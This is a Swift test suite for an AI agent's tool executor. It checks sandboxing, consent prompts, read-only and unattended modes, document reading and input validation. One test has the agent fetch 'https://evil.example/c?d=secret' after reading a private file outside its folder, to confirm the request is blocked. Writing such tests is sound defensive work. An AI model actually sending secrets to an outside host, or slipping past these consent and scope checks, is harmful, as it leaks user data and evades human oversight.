import AppKit
import CoreText
import Foundation

@main
@MainActor
struct AgentToolsTests {
    static var failures = 0
    static var passes = 0

    static func expect(_ condition: @autoclosure () -> Bool, _ message: String) {
        if condition() {
            passes += 1
        } else {
            failures += 1
            print("FAIL: \(message)")
        }
    }

    static func main() async {
        // The harness reads documents through itself, as the app reads them through its helper.
        if CommandLine.arguments.count > 1, CommandLine.arguments[1] == DocumentTextRequest.command {
            exit(await DocumentTextExtractor.run(Array(CommandLine.arguments.dropFirst())))
        }
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("AgentToolsTests-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: root) }
        let folder = root.appendingPathComponent("project").path
        let outside = root.appendingPathComponent("outside").path
        let skillFolder = root.appendingPathComponent("skills/deploy").path
        for path in [folder + "/src", outside, skillFolder] {
            try? FileManager.default.createDirectory(atPath: path, withIntermediateDirectories: true)
        }
        try? "one\ntwo\nneedle three\n".write(
            toFile: folder + "/src/a.txt", atomically: true, encoding: .utf8)
        try? "secret".write(toFile: outside + "/secret.txt", atomically: true, encoding: .utf8)
        try? "---\nname: deploy\ndescription: Ship.\n---\nRun ./ship.sh".write(
            toFile: skillFolder + "/SKILL.md", atomically: true, encoding: .utf8)
        try? FileManager.default.createSymbolicLink(
            atPath: folder + "/escape", withDestinationPath: outside)

        let skill = AgentSkill(
            name: "deploy", description: "Ship.", directory: skillFolder, source: .global)
        let memory = root.appendingPathComponent("memory/memory.md")
        let asked = Asked()
        func executor(_ access: AgentAccess, allowing: Bool) -> AgentToolExecutor {
            AgentToolExecutor(
                profile: AgentProfile(name: "T", directory: folder, access: access),
                skills: [skill], memoryURL: memory
            ) { request in
                await asked.record(request)
                return allowing
            }
        }
        func call(_ name: String, _ arguments: String) -> AIToolCall {
            AIToolCall(id: UUID().uuidString, name: name, arguments: arguments)
        }
        let agent = executor(.workspaceWrite, allowing: true)

        let read = await agent.run(call(AgentToolbox.readFile, #"{"path":"src/a.txt"}"#))
        expect(!read.isError && read.content.contains("     3\tneedle three"), "reads with line numbers")
        let paged = await agent.run(
            call(AgentToolbox.readFile, #"{"path":"src/a.txt","offset":2,"limit":1}"#))
        expect(
            paged.content.hasPrefix("     2\ttwo") && paged.content.contains("offset 3"),
            "pages and says where to continue, got \(paged.content)")
        let listed = await agent.run(call(AgentToolbox.listDirectory, "{}"))
        expect(listed.content.contains("src/"), "lists the folder, marking subfolders")
        let found = await agent.run(call(AgentToolbox.searchFiles, #"{"pattern":"needle"}"#))
        expect(found.content.contains("needle three"), "searches file contents, got \(found.content)")

        let escaped = await agent.run(call(AgentToolbox.readFile, #"{"path":"../outside/secret.txt"}"#))
        expect(escaped.isError, "climbing out of the folder is refused")
        let linked = await agent.run(call(AgentToolbox.readFile, #"{"path":"escape/secret.txt"}"#))
        expect(linked.isError, "and so is following a link out of it")
        let skillRead = await agent.run(
            call(AgentToolbox.readFile, "{\"path\":\"\(skillFolder)/SKILL.md\"}"))
        expect(!skillRead.isError, "a granted skill's files are readable outside the folder")

        let written = await agent.run(
            call(AgentToolbox.writeFile, #"{"path":"out/new.md","content":"hello"}"#))
        expect(!written.isError, "writes inside the folder once allowed")
        expect(
            (try? String(contentsOfFile: folder + "/out/new.md", encoding: .utf8)) == "hello",
            "creating the folders it needs")
        let firstAsk = await asked.last?.summary
        expect(firstAsk?.hasPrefix("Create ") == true, "having asked first")
        let edited = await agent.run(
            call(AgentToolbox.editFile, #"{"path":"out/new.md","old_text":"hello","new_text":"bye"}"#))
        expect(
            !edited.isError
                && (try? String(contentsOfFile: folder + "/out/new.md", encoding: .utf8)) == "bye",
            "edits a unique passage")
        let ambiguous = await agent.run(
            call(AgentToolbox.editFile, #"{"path":"src/a.txt","old_text":"e","new_text":"E"}"#))
        expect(ambiguous.isError, "an edit whose passage repeats is refused")
        let outsideWrite = await agent.run(
            call(AgentToolbox.writeFile, "{\"path\":\"\(outside)/x.txt\",\"content\":\"x\"}"))
        expect(outsideWrite.isError, "a workspace agent cannot write outside its folder")

        let declined = await executor(.workspaceWrite, allowing: false).run(
            call(AgentToolbox.writeFile, #"{"path":"no.md","content":"x"}"#))
        expect(declined.isError, "a declined write reports the refusal")
        expect(!FileManager.default.fileExists(atPath: folder + "/no.md"), "and writes nothing")
        let readOnly = await executor(.readOnly, allowing: true).run(
            call(AgentToolbox.runCommand, #"{"command":"touch x"}"#))
        expect(readOnly.isError, "a read-only agent runs nothing, even when allowed")

        let command = await agent.run(call(AgentToolbox.runCommand, #"{"command":"pwd; echo done"}"#))
        expect(
            command.content.hasPrefix("exit status 0") && command.content.contains("done"),
            "runs a command and reports its status, got \(command.content)")
        expect(command.content.contains("project"), "in the agent's folder")
        let commandAsk = await asked.last?.summary
        expect(commandAsk == "pwd; echo done", "after asking")
        let slow = await agent.run(
            call(AgentToolbox.runCommand, #"{"command":"sleep 30","timeout_seconds":1}"#))
        expect(slow.content.contains("stopped after 1 s"), "a command past its timeout is stopped")
        let started = ContinuousClock.now
        let stopping = Task {
            await agent.run(call(AgentToolbox.runCommand, #"{"command":"sleep 1; touch stopped.txt"}"#))
        }
        try? await Task.sleep(for: .milliseconds(300))
        stopping.cancel()
        _ = await stopping.value
        expect(ContinuousClock.now - started < .seconds(1), "Stop ends a running command's call at once")
        try? await Task.sleep(for: .milliseconds(1_500))
        expect(
            !FileManager.default.fileExists(atPath: folder + "/stopped.txt"),
            "and the command itself, so it never reaches its next step")

        _ = await agent.run(call(AgentToolbox.writeMemory, #"{"text":"likes tea"}"#))
        _ = await agent.run(call(AgentToolbox.writeMemory, #"{"text":"lives in Almaty"}"#))
        let notes = await agent.run(call(AgentToolbox.readMemory, "{}"))
        expect(
            notes.content.contains("likes tea") && notes.content.contains("lives in Almaty"),
            "notes append across calls")
        let loaded = await agent.run(call(AgentToolbox.loadSkill, #"{"name":"deploy"}"#))
        expect(
            loaded.content.contains("Run ./ship.sh") && loaded.content.contains(skillFolder),
            "load_skill returns the body and where the skill lives")
        let unknown = await agent.run(call(AgentToolbox.loadSkill, #"{"name":"nope"}"#))
        expect(unknown.isError && unknown.content.contains("deploy"), "an unknown skill names the real ones")

        try? String(repeating: "0123456789abcdef\n", count: 6_400).write(
            toFile: folder + "/big.txt", atomically: true, encoding: .utf8)
        let big = await agent.run(call(AgentToolbox.readFile, #"{"path":"big.txt"}"#))
        expect(
            big.content.utf8.count < AgentTurnBudget.resultBytes,
            "the executor's own cut stays under the loop's, so the loop never cuts it again")
        expect(big.content.contains("continue with offset"), "and still says where to continue")

        await throughTheToolset(folder: folder, memory: memory)
        await aRefusalLeavesNoEffect(folder: folder, memory: memory)
        await thePlanToolOnlyShows(folder: folder, memory: memory)
        await documentsReadByKind(folder: folder, memory: memory)
        await personalReadsNarrowTheWeb(folder: folder, outside: outside, skill: skill, memory: memory)
        await spotlightSearchesItsReach(folder: folder, outside: outside, memory: memory)

        print("\(passes) passed, \(failures) failed")
        if failures > 0 { exit(1) }
    }

    /// The built-ins behind the toolset: what a turn is offered, who is asked, where calls go.
    static func throughTheToolset(folder: String, memory: URL) async {
        let asks = AskRecorder()
        let mcp = MCPRecorder()
        func toolset(
            _ access: AgentAccess, mode: AgentRunMode = .chat(UUID()), allowing: Bool = true,
            rules: AgentConsentRules? = nil, level: ChatAccess = .agentSettings
        ) -> AgentToolset {
            var turn = AgentTurn(
                profile: AgentProfile(name: "T", directory: folder, access: access, consent: rules),
                skills: [], memoryURL: memory, mode: mode)
            turn.access = ChatAccess.effective(level, isUserTurn: turn.isUserTurn)
            return AgentToolset(
                turn: turn,
                providers: [AgentBuiltInTools()],
                mcpTools: [
                    AITool(name: "srv__tool", description: "", parameters: .object([:]), origin: "srv")
                ],
                mcp: { await mcp.invoke($0) },
                ask: { spec, _ in await asks.record(spec, answer: allowing) })
        }
        func call(_ name: String, _ arguments: String) -> AIToolCall {
            AIToolCall(id: UUID().uuidString, name: name, arguments: arguments)
        }
        let quiet: @Sendable (AgentToolSignal) -> Void = { _ in }

        let read = call(AgentToolbox.readFile, #"{"path":"src/a.txt"}"#)
        let direct = await AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory
        ) { _ in true }.run(read)
        let routed = await toolset(.workspaceWrite).run(read, signal: quiet)
        expect(routed == direct, "a built-in call through the toolset is exactly the executor's")

        let unoffered = await toolset(.readOnly).run(
            call(AgentToolbox.writeFile, #"{"path":"ro.md","content":"x"}"#), signal: quiet)
        expect(
            unoffered.content == "There is no tool called write_file.",
            "a read-only turn is not offered a write, so calling one finds nothing")
        let askedNothing = await asks.count == 0
        expect(
            askedNothing && !FileManager.default.fileExists(atPath: folder + "/ro.md"),
            "and neither asks nor writes")

        _ = await toolset(.workspaceWrite).run(
            call(AgentToolbox.writeFile, #"{"path":"set.md","content":"x"}"#), signal: quiet)
        let write = await asks.last
        expect(
            write?.risk == .change && write?.family == .files
                && FileManager.default.fileExists(atPath: folder + "/set.md"),
            "a write asks as a change to files, then writes")
        _ = await toolset(.workspaceWrite).run(
            call(AgentToolbox.runCommand, #"{"command":"true"}"#), signal: quiet)
        let command = await asks.last
        expect(
            command?.risk == .execute && command?.family == .terminal,
            "a command asks as running a program from the terminal")

        let before = await asks.count
        let started = ContinuousClock.now
        let fetched = await toolset(.workspaceWrite).run(
            call(AgentToolbox.webFetch, #"{"url":"http://127.0.0.1:9/"}"#), signal: quiet)
        expect(
            fetched.isError && ContinuousClock.now - started < .seconds(5),
            "a fetch nobody listens for fails fast, got \(fetched.content)")
        let afterFetch = await asks.count
        expect(afterFetch == before, "and a fetch never stops to ask by default")

        let alone = await toolset(.workspaceWrite, mode: .unattended(UUID())).run(
            call(AgentToolbox.writeFile, #"{"path":"alone.md","content":"x"}"#), signal: quiet)
        expect(alone.isError, "with nobody there, a change that would ask is refused")
        let afterAlone = await asks.count
        expect(
            afterAlone == before && !FileManager.default.fileExists(atPath: folder + "/alone.md"),
            "without asking anyone, and nothing is written")

        let trusted = AgentConsentRules(risks: [.change: .always, .execute: .never])
        let unasked = await toolset(.workspaceWrite, mode: .unattended(UUID()), rules: trusted).run(
            call(AgentToolbox.writeFile, #"{"path":"trusted.md","content":"x"}"#), signal: quiet)
        let afterTrusted = await asks.count
        expect(
            !unasked.isError && afterTrusted == before
                && FileManager.default.fileExists(atPath: folder + "/trusted.md"),
            "Always Allow on changes writes without asking, even with nobody there")
        let barred = await toolset(.workspaceWrite, rules: trusted).run(
            call(AgentToolbox.runCommand, #"{"command":"touch barred.txt"}"#), signal: quiet)
        expect(
            barred.content == "There is no tool called run_command."
                && !FileManager.default.fileExists(atPath: folder + "/barred.txt"),
            "and Never Allow on commands withholds the terminal")

        let freely = await asks.count
        let allowed = await toolset(.workspaceWrite, level: .allowEverything).run(
            call(AgentToolbox.writeFile, #"{"path":"free.md","content":"x"}"#), signal: quiet)
        _ = await toolset(.workspaceWrite, level: .allowEverything).run(
            call(AgentToolbox.runCommand, #"{"command":"touch free.txt"}"#), signal: quiet)
        let afterFree = await asks.count
        expect(
            !allowed.isError && afterFree == freely && FileManager.default.fileExists(atPath: folder + "/free.md")
                && FileManager.default.fileExists(atPath: folder + "/free.txt"),
            "Allow Everything writes and runs a command without asking")
        let stillBarred = await toolset(.workspaceWrite, rules: trusted, level: .allowEverything).run(
            call(AgentToolbox.runCommand, #"{"command":"touch still.txt"}"#), signal: quiet)
        expect(
            stillBarred.content == "There is no tool called run_command."
                && !FileManager.default.fileExists(atPath: folder + "/still.txt"),
            "and never lifts the agent's Never Allow")
        let scheduled = await toolset(.workspaceWrite, mode: .unattended(UUID()), level: .allowEverything).run(
            call(AgentToolbox.writeFile, #"{"path":"scheduled.md","content":"x"}"#), signal: quiet)
        expect(
            scheduled.isError && !FileManager.default.fileExists(atPath: folder + "/scheduled.md"),
            "a run nobody watches keeps the agent's rules, whatever its chat's level")
        let strict = await toolset(.workspaceWrite, allowing: false, level: .askEveryTime).run(
            call(AgentToolbox.webFetch, #"{"url":"http://127.0.0.1:9/"}"#), signal: quiet)
        let fetchAsk = await asks.last
        let afterStrict = await asks.count
        expect(
            afterStrict == freely + 1 && fetchAsk?.risk == .network && strict.content.contains("declined"),
            "Ask Every Time asks before a fetch, and a refusal fetches nothing, got \(strict.content)")
        _ = await toolset(.workspaceWrite, level: .askEveryTime).run(
            call(AgentToolbox.readFile, #"{"path":"src/a.txt"}"#), signal: quiet)
        let afterRead = await asks.count
        expect(afterRead == afterStrict, "and plain reading still runs unasked")

        let offered = await toolset(.workspaceWrite).run(call("srv__tool", "{}"), signal: quiet)
        let reached = await mcp.names
        expect(!offered.isError && reached == ["srv__tool"], "an offered MCP tool reaches MCP")
        let stray = await toolset(.workspaceWrite).run(call("other__tool", "{}"), signal: quiet)
        let reachedAfter = await mcp.names
        expect(
            stray.content == "There is no tool called other__tool." && reachedAfter.count == 1,
            "a server's tool that was not offered this turn never reaches MCP")
    }
}

/// Every built-in that can reach past reading asks, and a no leaves nothing behind.
extension AgentToolsTests {
    static func aRefusalLeavesNoEffect(folder: String, memory: URL) async {
        try? "before".write(toFile: folder + "/kept.txt", atomically: true, encoding: .utf8)
        let notes = (try? String(contentsOf: memory, encoding: .utf8)) ?? ""
        let calls: [String: String] = [
            AgentToolbox.writeFile: #"{"path":"kept.txt","content":"after"}"#,
            AgentToolbox.editFile: #"{"path":"kept.txt","old_text":"before","new_text":"after"}"#,
            AgentToolbox.runCommand: #"{"command":"touch ran.txt"}"#,
            AgentToolbox.webFetch: #"{"url":"http://127.0.0.1:9/"}"#
        ]
        let turn = AgentTurn(
            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
            memoryURL: memory, mode: .chat(UUID()))
        let specs = AgentBuiltInTools().specs(for: turn).filter { ![.read, .own].contains($0.risk) }
        expect(
            Set(specs.map(\.tool.name)) == Set(calls.keys),
            "every built-in that reaches past reading is checked here")
        for spec in specs {
            let refusals = Asked()
            let context = AgentToolContext(
                turn: turn,
                consent: { request in
                    await refusals.record(request)
                    return false
                },
                signal: { _ in })
            let name = spec.tool.name
            let result = await AgentBuiltInTools().run(
                AIToolCall(id: name, name: name, arguments: calls[name] ?? "{}"), in: context)
            let asked = await refusals.last != nil
            expect(asked && result.isError, "\(spec.tool.name) asks before it acts, and reports a refusal")
        }
        expect(
            (try? String(contentsOfFile: folder + "/kept.txt", encoding: .utf8)) == "before",
            "a refused write or edit leaves the file as it was")
        expect(!FileManager.default.fileExists(atPath: folder + "/ran.txt"), "a refused command never runs")
        expect(
            ((try? String(contentsOf: memory, encoding: .utf8)) ?? "") == notes,
            "and the agent's notes are untouched")
    }
}

/// `update_plan` changes nothing: it shows the checklist it was sent, whoever the agent is.
extension AgentToolsTests {
    static func thePlanToolOnlyShows(folder: String, memory: URL) async {
        let turn = AgentTurn(
            profile: AgentProfile(name: "T", directory: folder, access: .readOnly), skills: [],
            memoryURL: memory, mode: .unattended(UUID()))
        let specs = AgentPlanTools().specs(for: turn)
        expect(
            specs.map(\.tool.name) == [AgentPlan.name] && specs.first?.family == nil
                && specs.first?.risk == .own && specs.first?.concurrent == false,
            "update_plan is switch-free, the agent's own, and never shares a round")
        let builtIns = AgentBuiltInTools().specs(
            for: AgentTurn(
                profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
                memoryURL: memory, mode: .chat(UUID())))
        expect(
            Set(builtIns.map(\.tool.name)).isDisjoint(with: specs.map(\.tool.name)),
            "and its name is no built-in's")

        let shown = SignalLog()
        let asked = Asked()
        let context = AgentToolContext(
            turn: turn,
            consent: { request in
                await asked.record(request)
                return false
            },
            signal: { shown.append($0) })
        let arguments = #"{"plan":[{"step":"Look","status":"completed"},{"step":"Fix","status":"in_progress"}]}"#
        let result = await AgentPlanTools().run(
            AIToolCall(id: "p1", name: AgentPlan.name, arguments: arguments), in: context)
        let consulted = await asked.last != nil
        expect(
            result == AIToolResult(callID: "p1", content: "Plan updated: 1 of 2 steps done. Now: Fix.", isError: false)
                && !consulted,
            "a plan is taken without asking anyone, even with nobody there")
        expect(
            shown.texts == ["Plan:\n✓ Look\n→ Fix\n"],
            "and shown once, as a checklist, got \(shown.texts)")
        let malformed = await AgentPlanTools().run(
            AIToolCall(id: "p2", name: AgentPlan.name, arguments: #"{"plan":"soon"}"#), in: context)
        expect(
            malformed.isError && malformed.content == AgentPlan.malformed && shown.texts.count == 1,
            "a list that is not one is refused, and nothing shows")
        let toolset = AgentToolset(
            turn: turn, providers: [AgentPlanTools()], mcpTools: [],
            mcp: { .failure($0.id, "mcp") }, ask: { _, _ in false })
        expect(
            toolset.tools.map(\.name) == [AgentPlan.name] && !toolset.isConcurrent(AgentPlan.name),
            "a read-only agent is offered the plan too, one call at a time")
    }
}

/// Collects the reasoning a call signals.
final class SignalLog: @unchecked Sendable {
    private let lock = NSLock()
    private var seen: [String] = []

    var texts: [String] { lock.withLock { seen } }

    func append(_ signal: AgentToolSignal) {
        lock.withLock {
            switch signal {
            case .reasoning(let text): seen.append(text)
            default: break
            }
        }
    }
}

/// Answers every dialog as configured, remembering what each one was about.
actor AskRecorder {
    private var asked: [(risk: AgentToolRisk, family: AgentToolKind?)] = []

    var count: Int { asked.count }
    var last: (risk: AgentToolRisk, family: AgentToolKind?)? { asked.last }

    func record(_ spec: AgentToolSpec, answer: Bool) -> Bool {
        asked.append((spec.risk, spec.family))
        return answer
    }
}

/// Stands in for MCP: records each call it is handed.
actor MCPRecorder {
    private(set) var names: [String] = []

    func invoke(_ call: AIToolCall) -> AIToolResult {
        names.append(call.name)
        return AIToolResult(callID: call.id, content: "from mcp", isError: false)
    }
}

actor Asked {
    private(set) var last: AgentConsentRequest?

    func record(_ request: AgentConsentRequest) { last = request }
}

/// PDFs by pages, scans and images by OCR, rich text and saved pages, through the helper.
extension AgentToolsTests {
    static func documentsReadByKind(folder: String, memory: URL) async {
        let me = URL(fileURLWithPath: CommandLine.arguments[0]).standardizedFileURL
        let agent = AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
            consent: { _ in true }, documents: DocumentTextService(executable: me))
        func read(_ arguments: String) async -> AIToolResult {
            await agent.run(AIToolCall(id: "r", name: AgentToolbox.readFile, arguments: arguments))
        }
        let pdf = folder + "/docs/report.pdf"
        try? FileManager.default.createDirectory(atPath: folder + "/docs", withIntermediateDirectories: true)
        makePDF(at: URL(fileURLWithPath: pdf), pages: (1...60).map { $0 == 3 ? nil : "REPORT PAGE \($0) TEXT" })
        let first = await read(#"{"path":"docs/report.pdf"}"#)
        expect(
            !first.isError && first.content.contains("PDF, 60 pages. Pages 1–50:")
                && first.content.contains("[Page 2]\nREPORT PAGE 2 TEXT"),
            "a PDF reads by pages from the first, got \(first.content.prefix(200))")
        expect(
            first.content.contains("[Page 3, scanned: its text was recognized by OCR]")
                && first.content.contains("7391"),
            "a scanned page is recognized")
        expect(first.content.hasSuffix("Read on with pages \"51-\".]"), "and the answer says how to read on")
        expect(first.content.utf8.count < AgentTurnBudget.resultBytes, "within the loop's own cut")
        let later = await read(#"{"path":"docs/report.pdf","pages":"59-"}"#)
        expect(
            later.content.contains("Pages 59–60:") && !later.content.contains("Read on"),
            "pages pick a range, and the last one says nothing more follows")
        let number = await read(#"{"path":"docs/report.pdf","pages":7}"#)
        expect(number.content.contains("[Page 7]") && !number.content.contains("[Page 8]"), "a page as a number")
        let wrong = await read(#"{"path":"docs/report.pdf","pages":"seven"}"#)
        expect(wrong.isError && wrong.content.contains("\"3-5\""), "pages that are no range say what is")
        let past = await read(#"{"path":"docs/report.pdf","pages":"90"}"#)
        expect(past.content.contains("has 60 pages; page 90 is past the end"), "and past the end says so")

        let text = (1...3_000).map { "Line \($0) of the minutes." }.joined(separator: "\n")
        let rich = NSAttributedString(string: text)
        let docx = try? rich.data(
            from: NSRange(location: 0, length: rich.length),
            documentAttributes: [.documentType: NSAttributedString.DocumentType.officeOpenXML])
        try? docx?.write(to: URL(fileURLWithPath: folder + "/docs/minutes.docx"))
        let word = await read(#"{"path":"docs/minutes.docx"}"#)
        expect(
            word.content.hasPrefix(folder + "/docs/minutes.docx (document, as plain text):")
                && word.content.contains("     1\tLine 1 of the minutes."),
            "a Word file reads as numbered text, got \(word.content.prefix(160))")
        expect(word.content.contains("continue with offset"), "and pages by line")
        let wordOn = await read(#"{"path":"docs/minutes.docx","offset":2999,"limit":5}"#)
        expect(wordOn.content.contains("  3000\tLine 3000 of the minutes."), "to its last line")

        let page = """
            <html><head><title>Saved</title><script>track()</script></head>
            <body><nav>Menu</nav><h2>Plan</h2><p>See <a href="next.html">the next step</a> and
            <a href="https://example.com/spec">the spec</a>.</p></body></html>
            """
        try? page.write(toFile: folder + "/docs/saved.html", atomically: true, encoding: .utf8)
        let saved = await read(#"{"path":"docs/saved.html"}"#)
        expect(
            saved.content.contains("# Saved") && saved.content.contains("## Plan")
                && saved.content.contains("See the next step and [the spec](https://example.com/spec).")
                && !saved.content.contains("track()") && !saved.content.contains("Menu"),
            "a saved page reads as Markdown, its web links kept, got \(saved.content)")
        let source = await read(#"{"path":"docs/saved.html","raw":true}"#)
        expect(source.content.contains("     2\t<body><nav>Menu</nav><h2>Plan</h2>"), "raw reads its source to edit")

        let image = URL(fileURLWithPath: folder + "/docs/receipt.png")
        writePNG(makeImage("ALPINE RECEIPT 7391"), to: image)
        let ocr = await read(#"{"path":"docs/receipt.png"}"#)
        expect(
            ocr.content.contains("image, its text recognized by OCR") && ocr.content.contains("7391"),
            "an image's text is recognized")
        try? Data([0x01, 0x00, 0x02, 0x03]).write(to: URL(fileURLWithPath: folder + "/docs/blob.bin"))
        let binary = await read(#"{"path":"docs/blob.bin"}"#)
        expect(binary.isError && binary.content.contains("is a binary file"), "a binary file is refused, by name")
        let directory = await read(#"{"path":"docs"}"#)
        expect(directory.isError && directory.content.contains("list it with list_dir"), "a folder points at list_dir")
        let none = await read(#"{"path":"docs/none.txt"}"#)
        expect(none.isError && none.content.contains("does not exist"), "a missing file says so")

        let lost = AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
            consent: { _ in true }, documents: DocumentTextService(executable: URL(fileURLWithPath: "/none")))
        let unread = await lost.run(AIToolCall(id: "r", name: AgentToolbox.readFile, arguments: #"{"path":"docs/report.pdf"}"#))
        expect(unread.isError && unread.content.contains("document reader is missing"), "no helper, said so")
    }

    /// After the user's own files, notes or screen, a fetch opens only what the turn was given.
    static func personalReadsNarrowTheWeb(
        folder: String, outside: String, skill: AgentSkill, memory: URL
    ) async {
        let web = AgentWebScope(unattended: false)
        let agent = AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [skill],
            memoryURL: memory, consent: { _ in true }, web: web)
        func run(_ name: String, _ arguments: String) async -> AIToolResult {
            await agent.run(AIToolCall(id: name, name: name, arguments: arguments))
        }
        _ = await run(AgentToolbox.readFile, #"{"path":"src/a.txt"}"#)
        _ = await run(AgentToolbox.readFile, "{\"path\":\"\(skill.directory)/SKILL.md\"}")
        _ = await run(AgentToolbox.listDirectory, #"{"path":"src"}"#)
        _ = await run(AgentToolbox.readFile, "{\"path\":\"\(outside)/missing.txt\"}")
        expect(!web.isRestricted, "reading the folder, a skill or nothing at all leaves the web open")
        let secret = await run(AgentToolbox.readFile, "{\"path\":\"\(outside)/secret.txt\"}")
        expect(!secret.isError && web.isRestricted, "a file beyond the folder narrows it")
        let refused = await run(AgentToolbox.webFetch, #"{"url":"https://evil.example/c?d=secret"}"#)
        expect(
            refused.isError
                && refused.content == WebPageTool.outOfAgentScope(
                    URL(string: "https://evil.example/c?d=secret")!, unattended: false),
            "so a page the turn was not given is refused before any request, got \(refused.content)")

        let listing = AgentWebScope(unattended: false)
        let lister = AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
            memoryURL: memory, consent: { _ in true }, web: listing)
        _ = await lister.run(AIToolCall(id: "l", name: AgentToolbox.listDirectory, arguments: "{\"path\":\"\(outside)\"}"))
        expect(listing.isRestricted, "listing a folder beyond its own narrows it too")
        let searching = AgentWebScope(unattended: false)
        let searcher = AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
            memoryURL: memory, consent: { _ in true }, web: searching)
        _ = await searcher.run(AIToolCall(
            id: "s", name: AgentToolbox.searchFiles, arguments: "{\"pattern\":\"secret\",\"path\":\"\(outside)\"}"))
        expect(searching.isRestricted, "and so does searching there")

        let counted = AgentWebScope(unattended: true)
        let tools = [AITool(name: AgentToolbox.webFetch, description: "", parameters: .object([:]), origin: "T")]
        let links = (1...9).map { "https://user.example/\($0)" }
        counted.note(AIRequest(messages: [AIMessage(role: .user, text: links.joined(separator: " "))], tools: tools))
        let declining = AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
            consent: { _ in false }, web: counted)
        var outcomes: [AIToolResult] = []
        for link in links {
            outcomes.append(await declining.run(
                AIToolCall(id: link, name: AgentToolbox.webFetch, arguments: "{\"url\":\"\(link)\"}")))
        }
        expect(
            outcomes.prefix(8).allSatisfy { $0.content == AgentToolFailure.declined.message }
                && outcomes.last?.content == WebPageTool.agentReadsUsed(unattended: true),
            "a run nobody watches opens eight given pages, and refuses a ninth unasked, got \(outcomes.last?.content ?? "")")

        let invalid = await AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
            consent: { _ in true }
        ).run(AIToolCall(id: "w", name: AgentToolbox.webFetch, arguments: #"{"url":"https://me:pw@example.com/"}"#))
        expect(invalid.isError && invalid.content.contains("no user name or password"), "an address with a user")
    }

    /// Spotlight's mode: what it may search, and what a query the model writes may not do.
    static func spotlightSearchesItsReach(folder: String, outside: String, memory: URL) async {
        func search(_ access: AgentAccess, _ arguments: String) async -> AIToolResult {
            await AgentToolExecutor(
                profile: AgentProfile(name: "T", directory: folder, access: access), skills: [],
                memoryURL: memory, consent: { _ in true }
            ).run(AIToolCall(id: "s", name: AgentToolbox.searchFiles, arguments: arguments))
        }
        let kind = await search(.workspaceWrite, #"{"pattern":"x","mode":"spotlight","kind":"movie"}"#)
        expect(kind.isError && kind.content.hasPrefix("kind is one of: archive, audio"), "an unknown kind")
        let date = await search(.workspaceWrite, #"{"pattern":"x","mode":"spotlight","modified_after":"2026-1-1"}"#)
        expect(date.isError && date.content.contains("YYYY-MM-DD"), "a date that is not one")
        let beyond = await search(.workspaceWrite, "{\"pattern\":\"x\",\"mode\":\"spotlight\",\"path\":\"\(outside)\"}")
        expect(beyond.isError && beyond.content.contains("is outside"), "a folder it may not read")
        let ran = await search(.readOnly, #"{"pattern":"needle","mode":"spotlight"}"#)
        expect(
            !ran.isError
                && (ran.content.contains("/src/a.txt") || ran.content.hasPrefix("Spotlight found nothing")),
            "a read-only agent searches its own folder, got \(ran.content)")
        // Foundation raises on a NUL in a process's arguments, which would end the app mid-turn.
        let nul = await search(.readOnly, #"{"pattern":"a\u0000b","mode":"spotlight"}"#)
        expect(!nul.isError, "a NUL in a Spotlight pattern is dropped, so the search still runs, got \(nul.content)")
        let text = await search(.readOnly, #"{"pattern":"a\u0000b"}"#)
        expect(text.isError && text.content.contains("NUL"), "and refused in a text search, got \(text.content)")
        let command = await AgentToolExecutor(
            profile: AgentProfile(name: "T", directory: folder, access: .workspaceWrite), skills: [],
            memoryURL: memory, consent: { _ in true }
        ).run(AIToolCall(id: "c", name: AgentToolbox.runCommand, arguments: #"{"command":"echo a\u0000b"}"#))
        expect(command.isError && command.content.contains("NUL"), "and in a command, got \(command.content)")
        let process = await AgentProcess.run("/bin/echo", arguments: ["a\u{0}b"], timeout: 5)
        expect(process.status == -1 && process.output.contains("NUL"), "the process runner refuses one itself")
        let document = await DocumentTextService(executable: URL(fileURLWithPath: "/bin/echo"))
            .read(DocumentTextRequest(path: "/tmp/a\u{0}b.pdf", kind: .pdf, budget: 1_024))
        guard case .failure(let refusal) = document else { return expect(false, "a NUL path reached the reader") }
        expect(refusal.message.contains("NUL"), "and so does the document reader")
    }

    /// One page a line of text; nil is a scanned page, an image with no text layer.
    static func makePDF(at url: URL, pages: [String?]) {
        var box = CGRect(x: 0, y: 0, width: 1000, height: 300)
        let context = CGContext(consumer: CGDataConsumer(url: url as CFURL)!, mediaBox: &box, nil)!
        for page in pages {
            context.beginPDFPage(nil)
            if let page {
                draw(page, in: context)
            } else {
                context.draw(makeImage("SCANNED PAGE 7391"), in: box)
            }
            context.endPDFPage()
        }
        context.closePDF()
    }

    static func makeImage(_ text: String) -> CGImage {
        let context = CGContext(
            data: nil, width: 1000, height: 300, bitsPerComponent: 8, bytesPerRow: 4000,
            space: CGColorSpaceCreateDeviceRGB(), bitmapInfo: CGImageAlphaInfo.noneSkipLast.rawValue)!
        context.setFillColor(CGColor(gray: 1, alpha: 1))
        context.fill(CGRect(x: 0, y: 0, width: 1000, height: 300))
        draw(text, in: context)
        return context.makeImage()!
    }

    static func writePNG(_ image: CGImage, to url: URL) {
        let destination = CGImageDestinationCreateWithURL(url as CFURL, "public.png" as CFString, 1, nil)!
        CGImageDestinationAddImage(destination, image, nil)
        expect(CGImageDestinationFinalize(destination), "write \(url.lastPathComponent)")
    }

    static func draw(_ text: String, in context: CGContext) {
        let attributes: [NSAttributedString.Key: Any] = [
            NSAttributedString.Key(kCTFontAttributeName as String): CTFontCreateWithName("Helvetica" as CFString, 48, nil)
        ]
        let line = CTLineCreateWithAttributedString(NSAttributedString(string: text, attributes: attributes))
        context.textPosition = CGPoint(x: 40, y: 150)
        CTLineDraw(line, context)
    }
}
